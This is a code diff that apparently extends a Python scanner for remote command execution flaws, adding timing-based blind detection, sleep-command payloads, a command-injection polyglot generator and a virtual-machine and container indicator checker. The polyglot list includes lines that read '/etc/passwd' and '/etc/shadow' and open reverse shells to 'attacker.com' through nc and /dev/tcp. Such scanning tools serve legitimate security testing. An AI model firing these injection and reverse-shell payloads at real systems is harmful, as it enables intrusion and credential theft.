@@ -82,6 +82,141 @@ class RCEVulnerability:
     timestamp: float = field(default_factory=time.time)
 
 
+class BlindRCEDetector:
+    TIME_DETECTION_THRESHOLD = 3.5
+    
+    @staticmethod
+    def analyze_timing_based_rce(baseline_time: float, injected_time: float, 
+                                  sleep_duration: int = 5) -> Tuple[bool, float]:
+        if baseline_time <= 0:
+            baseline_time = 0.2
+        
+        time_diff = injected_time - baseline_time
+        expected_min = sleep_duration * 0.6
+        expected_max = sleep_duration * 1.5
+        
+        if expected_min <= time_diff <= expected_max:
+            confidence = min((time_diff / sleep_duration) * 0.95, 0.98)
+            return True, confidence
+        
+        if time_diff >= expected_min * 0.8:
+            confidence = 0.75
+            return True, confidence
+        
+        return False, 0.0
+    
+    @staticmethod
+    def generate_blind_detection_payloads(separator: str = ";") -> List[str]:
+        payloads = []
+        
+        for delay in [5, 7, 10]:
+            payloads.extend([
+                f"sleep {delay}",
+                f"timeout /t {delay}",
+                f"ping -n {delay} 127.0.0.1",
+                f"python -c 'import time; time.sleep({delay})'",
+                f"perl -e 'sleep({delay})'",
+                f"ruby -e 'sleep {delay}'",
+                f"php -r 'sleep({delay});'",
+                f"bash -c 'sleep {delay}'",
+            ])
+        
+        return payloads
+    
+    @staticmethod
+    def detect_out_of_band_execution(dns_log: List[str], http_log: List[str]) -> Tuple[bool, List[str], float]:
+        evidences = []
+        
+        if dns_log:
+            evidences.extend(dns_log)
+        if http_log:
+            evidences.extend(http_log)
+        
+        confidence = min(len(evidences) * 0.3, 0.95)
+        
+        return len(evidences) > 0, evidences, confidence
+
+
+class PolyglotCommandGenerator:
+    @staticmethod
+    def generate_os_specific_polyglots() -> List[str]:
+        polyglots = []
+        
+        base_commands = [
+            "id",
+            "whoami",
+            "pwd",
+            "uname -a",
+            "systeminfo",
+            "dir",
+            "ls -la",
+        ]
+        
+        separators = [';', '|', '||', '&&', '\n', '`', '$(', '%0a%0d']
+        
+        for cmd in base_commands:
+            for sep in separators:
+                polyglots.append(f"{sep}{cmd}")
+                polyglots.append(f"echo test{sep}{cmd}")
+                polyglots.append(f"{sep}({cmd})")
+                polyglots.append(f"{sep}{{{cmd}}}")
+        
+        advanced = [
+            "| cat /etc/passwd #",
+            "; cat /etc/shadow #",
+            "|| find / -name '*.txt' 2>/dev/null #",
+            "&& ls -la / #",
+            "\n/bin/sh\nid\n",
+            "$(whoami)",
+            "`id`",
+            "| nc -e /bin/sh attacker.com 4444",
+            "; bash -i >& /dev/tcp/attacker.com/4444 0>&1 #",
+            "| python -c 'import socket' #",
+        ]
+        
+        polyglots.extend(advanced)
+        return list(set(polyglots))
+
+
+class SandboxEvasionDetector:
+    SANDBOX_INDICATORS = {
+        'detection_methods': [
+            r'sandbox', r'virtual', r'virtual machine', r'vmware', r'virtualbox',
+            r'hyper-v', r'xen', r'kvm', r'docker', r'container'
+        ],
+        'processes': [
+            'vmmem', 'vmusrvc', 'vmtoolsd', 'vboxservice', 'qemu',
+            'xenbus', 'docker', 'containerd'
+        ],
+        'files': [
+            '/proc/vz', '/.dockerenv', '/sys/hypervisor', '/proc/xen',
+            'C:\\Windows\\System32\\drivers\\vmmouse.sys'
+        ]
+    }
+    
+    @staticmethod
+    def detect_sandbox_environment(output: str) -> Tuple[bool, List[str], float]:
+        indicators_found = []
+        confidence = 0.0
+        
+        for indicator in SandboxEvasionDetector.SANDBOX_INDICATORS['detection_methods']:
+            if re.search(indicator, output, re.I):
+                indicators_found.append(f"detected_{indicator}")
+                confidence += 0.15
+        
+        for process in SandboxEvasionDetector.SANDBOX_INDICATORS['processes']:
+            if process in output.lower():
+                indicators_found.append(f"process_{process}")
+                confidence += 0.2
+        
+        for filepath in SandboxEvasionDetector.SANDBOX_INDICATORS['files']:
+            if filepath in output:
+                indicators_found.append(f"file_{filepath}")
+                confidence += 0.25
+        
+        return len(indicators_found) > 0, indicators_found, min(confidence, 1.0)
+
+
 class SystemOutputAnalyzer:
     UNIX_COMMANDS_OUTPUT = {
         'ls': {
